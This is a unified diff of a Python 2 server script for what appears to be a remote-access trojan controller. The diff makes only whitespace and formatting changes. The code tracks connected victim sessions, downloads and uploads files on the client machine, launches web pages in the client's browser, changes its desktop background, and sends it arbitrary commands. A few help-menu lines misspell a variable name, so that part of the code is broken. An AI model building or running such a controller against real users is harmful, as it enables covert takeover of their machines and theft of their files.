@@ -22,14 +22,14 @@ class ClientThread(threading.Thread):
     def __init__(self, sockett,socks,adds,users):
         threading.Thread.__init__(self)
         self.sockett = sockett
-        self.socks=socks
-        self.adds=adds
-        self.users=users
+        self.socks = socks
+        self.adds = adds
+        self.users = users
         
 
     def run(self):
 		clientsock, addr = self.sockett.accept()
-		username=clientsock.recv(1024)
+		username = clientsock.recv(1024)
 		self.socks.append(clientsock)
 		self.adds.append(addr)
 		self.users.append(username)
@@ -37,11 +37,11 @@ class ClientThread(threading.Thread):
 
 def download(conn,command):
 
-	x,src,dst=map(str,command.split(' '))
+	x,src,dst = map(str,command.split(' '))
 	conn.send(command)
 	f = open(dst,'wb') 
 	bits = conn.recv(1024)
-	while bits!='': 
+	while bits != '': 
 		if 'Unable to find out the file' in bits:
 			print '[-] Unable to find out the file'
 			break
@@ -55,9 +55,9 @@ def download(conn,command):
 			break
 		bits=conn.recv(1024)
 
-	md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()	
+	md5_sv = hashlib.md5(open(dst,'rb').read()).hexdigest()	
 	conn.send(md5_sv)
-	if conn.recv(1024)=='md5 OK':
+	if conn.recv(1024) == 'md5 OK':
 		print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
 	else :
 		print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
@@ -65,22 +65,22 @@ def download(conn,command):
 	
         
     
-def upload(conn,command):
+def upload(conn, command):
 
 
-	x,src,dst=map(str,command.split(' '))
+	x, src, dst = map(str, command.split(' '))
 	conn.send(command)
-	file_to_send=open(src,'rb')
-	packet=file_to_send.read(1024)
-	while packet!='':
+	file_to_send = open(src,'rb')
+	packet = file_to_send.read(1024)
+	while packet != '':
 		conn.send(packet) 
 		packet = file_to_send.read(1024)
 	conn.send('DONE')
 	file_to_send.close()
-	md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
+	md5_sv = hashlib.md5(open(src,'rb').read()).hexdigest()
 	conn.send(md5_sv)
 	print md5_sv
-	if conn.recv(1024)=='md5 OK':
+	if conn.recv(1024) == 'md5 OK':
 		print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
 	else :
 		print '[-] MD5 Checksum not Verified !'
@@ -93,20 +93,20 @@ def _help():
 	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
 	
 	while True:
-		help_command=str(raw_input('Help)'))
-		if help_command=='exit':
+		help_command = str(raw_input('Help)'))
+		if help_command == 'exit':
 			break
-		elif help_command=='help(terminate)':
+		elif help_command == 'help(terminate)':
 			print 'terminate ends the session'
-		elif help_command=='help(download)':
+		elif help_command == 'help(download)':
 			print 'download => downloads a file from the client machine ex: download #source #dest'
-		elif help_command=='help(upload)':
+		elif help_command == 'help(upload)':
 			print 'upload => uploads a file to the client machine ex: upload #source #dest'
-		elif hel_command=='help(username)':
+		elif hel_command == 'help(username)':
 			print 'username => returns the username of the client session'
-		elif hel_command=='help(browse)':
+		elif hel_command ==' help(browse)':
 			print 'browse => launches a web page in the client browser ex: browse www.google.com'
-		elif hel_command=='help(change_desktop_bg)':
+		elif hel_command == 'help(change_desktop_bg)':
 			print 'change_desktop_bg => changes the desktop background of the client ex : change_desktop_bg #path_of_image'
 	return
 
@@ -121,16 +121,16 @@ def _list():
 def connect():
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        port=8084
+        port = 8084
         s.bind(('127.0.0.1', port))
         s.listen(100)
         print '[+] Listening for incoming TCP connection on port ',port
-        threads=[]
-        socks=[]
-        users=[]
-        adds=[]
-        halt=False
-        index=-999
+        threads = []
+        socks = []
+        users = []
+        adds = []
+        halt = False
+        index = -999
         for i in range(10):
             newthread = ClientThread(s,socks,adds,users)
             newthread.start()
@@ -145,19 +145,19 @@ def connect():
                     for t in threads:
                	        t.join()
                	    break
-               	elif command=='who':
-               		if len(adds)==0:
+               	elif command == 'who':
+               		if len(adds) == 0:
                			print '[-] Nobody is connected yet'
                		else :
                			for i in range(len(adds)):
                				print 'Index : ',i,'| Address : ',adds[i][0],' | Username : ',users[i]
            
                	elif 'select' in command:
-               		index=command.split(' ')[-1]
-               		index=int(index)		
+               		index = command.split(' ')[-1]
+               		index = int(index)		
                	
                 elif 'terminate' in command:
-                        halt=True
+                        halt = True
                         break
                         socks[index].send('terminate')
                         conn.close() 
@@ -175,11 +175,11 @@ def connect():
                 elif 'clear' in command:
                 		subprocess.call('clear',shell=True)
                 		pass
-                elif command=='help':
+                elif command == 'help':
                 		_help()
-                elif command=='?':
+                elif command == '?':
                 		_list()
-                elif command=='':
+                elif command == '':
                 		pass
                 else :	
                         socks[index].send(command)
@@ -193,15 +193,3 @@ def main ():
 	connect()
 
 main()
-
-
-
-
-
-
-
-
-
-
-
-
